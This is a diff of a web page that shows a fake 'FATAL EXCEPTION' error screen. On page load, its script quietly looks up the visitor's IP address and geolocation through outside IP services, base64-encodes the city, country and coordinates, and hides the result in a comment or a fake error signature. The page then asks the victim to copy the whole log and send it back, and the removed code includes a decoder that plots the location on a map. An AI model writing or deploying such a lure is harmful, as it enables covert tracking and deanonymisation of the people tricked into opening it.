@@ -19,205 +19,128 @@
             align-items: center;
             text-align: center;
         }
-        #error-screen {
-            max-width: 90%;
-            padding: 20px;
-        }
         .glitch {
-            font-size: 4.8rem;
-            letter-spacing: 12px;
-            animation: glitch 5s infinite;
-            text-shadow: 0.06em 0 0 #f00, -0.04em -0.05em 0 #0ff;
+            font-size: 5.2rem;
+            letter-spacing: 14px;
+            animation: glitch 4.5s infinite;
+            text-shadow: 0.07em 0 0 #f00, -0.05em -0.06em 0 #0ff;
         }
         @keyframes glitch {
-            0%,100% { text-shadow: 0.06em 0 0 #f00, -0.04em -0.05em 0 #0ff; }
-            20% { text-shadow: -0.06em -0.03em 0 #f00, 0.03em 0.04em 0 #0ff; }
-            40% { text-shadow: 0.06em 0.04em 0 #f00, -0.03em 0 0 #0ff; }
+            0%,100% { text-shadow: 0.07em 0 0 #f00, -0.05em -0.06em 0 #0ff; }
+            15% { text-shadow: -0.07em -0.04em 0 #f00, 0.04em 0.05em 0 #0ff; }
+            35% { text-shadow: 0.07em 0.05em 0 #f00, -0.04em 0 0 #0ff; }
         }
-        #error-code-box {
-            margin: 40px 0;
-            padding: 16px;
-            background: #0a0a0a;
-            border: 1px dashed #333;
-            font-size: 1rem;
-            color: #555;
-            word-break: break-all;
-            max-height: 35vh;
-            overflow-y: auto;
-            user-select: text;
-        }
-        #decode-view {
-            display: none;
+        #error-main {
+            max-width: 92%;
             padding: 30px;
-            max-width: 90%;
         }
-        textarea {
-            width: 100%;
-            height: 140px;
-            background: #0d0d0d;
-            color: #0f0;
-            border: 1px solid #0f0;
-            font-family: monospace;
-            padding: 12px;
-            margin: 20px 0;
-            font-size: 1.05rem;
+        #error-log {
+            margin: 50px 0 30px;
+            font-size: 0.95rem;
+            color: #444;
+            line-height: 1.5;
+            max-height: 40vh;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
         }
-        button {
-            background: transparent;
-            border: 2px solid #0f0;
-            color: #0f0;
-            padding: 14px 40px;
-            font-size: 1.4rem;
-            cursor: pointer;
+        .small-hint {
+            position: fixed;
+            bottom: 12px;
+            right: 16px;
+            font-size: 0.7rem;
+            color: #222;
+            opacity: 0.3;
+            pointer-events: none;
         }
-        button:hover {
-            background: #0f0;
-            color: #000;
-        }
-        #ip-display { font-size: 2.6rem; word-break: break-all; margin: 25px 0; }
-        #geo { font-size: 1.9rem; color: #0f8; margin: 20px 0; }
-        #maplink { font-size: 1.5rem; color: #0ff; text-decoration: none; }
-        #status { color: #555; margin-top: 50px; font-size: 1.1rem; }
     </style>
 </head>
 <body>
 
-    <div id="error-screen">
-        <div class="glitch">FATAL ERROR #0x7B</div>
-        <p style="font-size:1.5rem; margin:35px 0 20px;">SHADOW NODE INTEGRITY COMPROMISED</p>
-        <p style="color:#666; margin-bottom:10px;">Error signature captured. Forward this full code block to support:</p>
+    <div id="error-main">
+        <div class="glitch">FATAL EXCEPTION</div>
+        <p style="font-size:1.6rem; margin:40px 0 20px;">SHADOW NODE CRASH - INTEGRITY VIOLATION</p>
+        <p style="color:#555; font-size:1.15rem; margin-bottom:15px;">
+            Critical kernel fault detected. Diagnostic payload captured.<br>
+            Forward this log fragment to support for root cause analysis:
+        </p>
         
-        <div id="error-code-box">Initializing diagnostic sequence...</div>
+        <div id="error-log">
+Loading diagnostic chain...
+[0x00007FF] KERNEL_SHADOW_PANIC
+[0xDEAD0001] INACCESSIBLE_MEMORY_BLOCK
+[0xBEEF1337] CORRUPTED_ENTROPY_STREAM
+Stack trace overflow → recovery loop engaged
+Memory dump partial: █▓▓▓▓▓░░░░░░░░░░ 47% complete
+Entropy buffer corruption detected
+Signature fragment: #A3F97B2E1C4D8E90uyyoiduyawo39284kjsdf
+Dump tail: ...== corrupted chain end ==
+Send full log to admin
+        </div>
+
+        <p style="color:#666; font-size:1.1rem;">
+            Please copy the entire log above (including any hidden fragments) and reply with it.
+        </p>
     </div>
 
-    <div id="decode-view">
-        <div style="font-size:2.2rem; margin-bottom:25px;">ERROR CODE DECODER</div>
-        <textarea id="paste-area" placeholder="Paste the complete error signature here..."></textarea>
-        <button onclick="decodeErrorCode()">DECODE & ANALYZE</button>
-        
-        <div id="result" style="margin-top:50px;">
-            <div id="ip-display">—</div>
-            <div id="geo">—</div>
-            <a id="maplink" href="#" target="_blank" style="display:none;">→ VIEW PRECISE LOCATION</a>
-            <div id="status"></div>
-        </div>
-    </div>
+    <div class="small-hint">v0.7b • build 20260308</div>
+
+    <!-- 
+       diagnostic shadow checksum fragment v0.7b 
+       integrity hash chain: 0xA3F9-7B2E-1C4D-8E90
+       partial entropy buffer: [REDACTED] 
+       encoded diagnostic payload: [BASE64 GOES HERE]
+    -->
 
     <script>
-        const FIXED_SEED = 42069420; // same seed everywhere - change if you want new pattern
-
-        function generateJunk(length) {
-            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+';
-            let junk = '';
-            const rng = new Math.seedrandom(FIXED_SEED + length); // deterministic per length
-            for (let i = 0; i < length; i++) {
-                junk += chars[Math.floor(rng() * chars.length)];
-            }
-            return junk;
-        }
-
-        async function captureAndBuildFakeCode() {
+        async function captureAndHide() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
 
-                let geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                let geo = await geoRes.json();
-
-                if (geo.error) {
-                    geoRes = await fetch(`https://ip-api.com/json/${ip}`);
-                    geo = await geoRes.json();
+                let geo = {};
+                try {
+                    geo = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
+                } catch {
+                    geo = await (await fetch(`https://ip-api.com/json/${ip}`)).json();
                 }
 
                 if (!geo.error && geo.status !== 'fail') {
-                    const realData = {
-                        ip: ip,
+                    const payload = {
+                        ip,
                         city: geo.city || geo.regionName || '?',
                         country: geo.country || geo.countryName || '?',
                         lat: geo.latitude || geo.lat || 0,
                         lon: geo.longitude || geo.lon || 0,
-                        ts: new Date().toISOString()
+                        captured: new Date().toISOString()
                     };
 
-                    const json = JSON.stringify(realData);
-                    const base64 = btoa(json);
+                    const json = JSON.stringify(payload);
+                    const b64 = btoa(json);
 
-                    // Build fake error code with same seed → same junk pattern
-                    const prefix = generateJunk(12);   // e.g. 9 chars hex-like
-                    const infix  = generateJunk(16);
-                    const suffix = generateJunk(20);
+                    // Inject into the deep comment
+                    const comment = document.body.lastChild;
+                    if (comment && comment.nodeType === 8) {  // comment node
+                        let text = comment.textContent;
+                        text = text.replace(
+                            'encoded diagnostic payload: [BASE64 GOES HERE]',
+                            'encoded diagnostic payload: ' + b64
+                        );
+                        comment.textContent = text;
+                    }
 
-                    // Insert base64 in pieces to make it less obvious
-                    const fakeCode = `#${prefix}${base64.slice(0,30)}${infix}${base64.slice(30)}${suffix}`;
-
-                    document.getElementById('error-code-box').textContent = 
-                        `ERROR BLOCK 0xFATAL\n` +
-                        `Timestamp corruption: ${new Date().toISOString().slice(0,19)}\n` +
-                        `Module: shadow_node.sys\n` +
-                        `Signature: ${fakeCode}\n` +
-                        `Partial hash: ${prefix}...${suffix.slice(-8)}\n` +
-                        `Send complete signature for forensic decode`;
-
-                    // For debug
-                    console.log("Real base64:", base64);
-                    console.log("Fake error code:", fakeCode);
+                    console.log("Payload hidden:", payload); // for your debug
                 }
-            } catch (e) {
-                document.getElementById('error-code-box').textContent = "Diagnostic capture failed - network anomaly";
+            } catch (err) {
+                console.warn("Capture failed", err);
             }
         }
 
-        function decodeErrorCode() {
-            const input = document.getElementById('paste-area').value.trim();
-            if (!input || input.length < 60) {
-                document.getElementById('status').textContent = "Invalid or incomplete signature";
-                return;
-            }
+        captureAndHide();
 
-            // Use same seed to regenerate expected junk
-            const rngPrefix = new Math.seedrandom(FIXED_SEED + 12);
-            const rngInfix  = new Math.seedrandom(FIXED_SEED + 16);
-            const rngSuffix = new Math.seedrandom(FIXED_SEED + 20);
-
-            const junkPrefix = generateJunk(12);
-            const junkInfix  = generateJunk(16);
-            const junkSuffix = generateJunk(20);
-
-            // Try to remove the known junk patterns
-            let cleaned = input.replace(`#${junkPrefix}`, '')
-                               .replace(junkInfix, '')
-                               .replace(junkSuffix, '');
-
-            // Also strip non-base64 chars that might remain
-            cleaned = cleaned.replace(/[^A-Za-z0-9+/=]/g, '');
-
-            try {
-                const jsonStr = atob(cleaned);
-                const data = JSON.parse(jsonStr);
-
-                document.getElementById('ip-display').textContent = data.ip;
-                document.getElementById('geo').innerHTML = 
-                    `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
-
-                if (data.lat && data.lon) {
-                    const map = document.getElementById('maplink');
-                    map.href = `https://www.openstreetmap.org/?mlat=${data.lat}&mlon=${data.lon}#map=15/${data.lat}/${data.lon}`;
-                    map.style.display = 'inline-block';
-                }
-
-                document.getElementById('status').textContent = `Signature decoded • Capture time: ${new Date(data.ts).toLocaleString()}`;
-            } catch (e) {
-                document.getElementById('status').textContent = "Decode failed - corrupted or wrong format";
-            }
-        }
-
-        // Auto-run capture on main page
-        captureAndBuildFakeCode();
-
-        // Show decode interface if #decode in URL
+        // Optional: if someone goes to #decode, show a fake decoder (but you don't need it)
         if (location.hash === '#decode') {
-            document.getElementById('error-screen').style.display = 'none';
-            document.getElementById('decode-view').style.display = 'flex';
+            document.body.innerHTML = '<div style="padding:40px; font-size:1.8rem;">DECODE INTERFACE (admin only)<br><br>Paste signature here → decode manually</div>';
         }
     </script>
 </body>
